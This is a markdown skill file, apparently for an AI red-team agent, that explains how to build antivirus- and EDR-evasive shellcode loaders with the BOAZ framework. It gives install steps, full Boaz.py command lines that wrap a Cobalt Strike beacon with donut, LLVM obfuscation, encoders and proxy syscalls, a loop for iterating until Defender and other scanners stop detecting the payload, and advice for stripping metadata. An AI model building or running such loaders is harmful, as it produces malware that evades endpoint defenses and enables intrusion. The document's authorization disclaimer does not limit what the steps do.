---
name: building-evasive-loaders-with-boaz
description: Build a multilayered AV/EDR-evasive shellcode loader with the BOAZ framework — donut/pe2shc shellcoding, LLVM/encoder/encryption chains, proxy syscalls — when the target's defensive stack requires more than a single-shot obfuscation step.
domain: cybersecurity
subdomain: red-team
tags:
  - av-evasion
  - edr-evasion
  - loader
  - shellcode
  - donut
  - boaz
  - payload-prep
version: '1.0'
license: MIT
execution_environment: windows-operator
---

# Building Evasive Loaders with BOAZ

Authorized red-team / payload-engineering use only. Build the loader on the
operator's Windows-operator box (or a Linux/Docker host); detonate it only
against in-scope targets.

## When to use

- Initial-access shellcode (Cobalt Strike beacon, Sliver implant, Mythic
  payload, custom stage-1) needs to pass Defender + the customer's EDR.
- The simpler chain (single-encode + donut + bog-standard loader) has been
  burnt; you need staged obfuscation: LLVM source-mangling, encoder chain,
  proxy syscalls, sleep masking.
- You want a reproducible loader pipeline (one command line → one binary)
  so iterations are auditable.

BOAZ is a multilayered evasion framework — it stitches together
donut/pe2shc shellcoding, LLVM source obfuscation, several payload
encoders, encryption (UUID, MAC, IPv4 stego, plain), proxy-syscall
execution, and a choice of loader templates. Treat it as the payload-build
front-end; `gocheck` + `MultCheck` are the verifiers downstream.

## Prerequisites

- Python 3 + pip on Linux/WSL, or use the BOAZ Docker image
  (`docker pull thomasxm/boaz`).
- mingw-w64 cross-compiler for the Windows build (`apt install mingw-w64`).
- A shellcode-able input — `.exe`, `.dll`, or raw shellcode.

## Install

```bash
git clone https://github.com/thomasxm/BOAZ_beta.git ~/tools/boaz
cd ~/tools/boaz
pip install -r requirements.txt
# or pull the docker image
docker pull thomasxm/boaz
```

## Quick build

```bash
# Convert notepad.exe → donut shellcode → UUID-encoded → loader "pluto"
python3 Boaz.py \
  -f ~/payloads/beacon.exe \
  -o ./out/beacon-stage1.exe \
  -t donut          # shellcoder: donut | pe2shc
  -obf              # enable LLVM source obfuscation
  -l 1              # loader template (1..N — see -h)
  -c pluto          # compiler / chain id
  -e uuid           # encoder: uuid | mac | ipv4 | xor | rc4 | aes | des

# More aggressive chain
python3 Boaz.py -f beacon.bin -o ./out/beacon-v2.exe \
  -t donut -obf -l 1 -c akira -e aes -a   # -a = proxy syscalls
```

`python3 Boaz.py -h` lists every loader, compiler, and encoder.

## Workflow inside Net-Runner

1. Build with BOAZ. Persist the exact command line in
   `.netrunner/evidence/payload-prep/<payload>-build.cmd`.
2. Verify with `infra:locating-defender-amsi-bad-bytes-with-gocheck` against
   Defender + AMSI.
3. Verify breadth with `infra:multi-engine-av-scan-with-multcheck`.
4. If any engine hits, do **not** brute-force — change one knob at a time
   (encoder first → loader template → add proxy syscalls → swap compiler
   chain). Iteration log goes in `nr_save_note`.
5. Detonate the final build in a representative Windows VM before staging
   to the real target. Capture EDR telemetry as evidence.

## Loader OPSEC

- BOAZ outputs are still binaries — they carry build metadata (PE timestamps,
  Rich header, PDB paths). Strip what you don't need (`strip`, `objcopy`),
  or compile with a faked timestamp / clean PDB path.
- Treat the unencrypted payload (`beacon.bin`) as crown-jewel evidence — it
  identifies the operator infra. Store in
  `.netrunner/evidence/payload-prep/`; never commit.
- The framework is "no longer actively maintained" upstream; pin the commit
  you built against in your evidence so the build is reproducible.

## Discipline

- BOAZ-built loaders are payloads, not exploits — they need a delivery
  vector (phish, exploit, post-ex hand-off). Pair with the spearphishing or
  exploit skill that fits the engagement scenario.
- Authorized engagements only. The Rules of Engagement must list payload
  generation; otherwise this skill should not be reached.
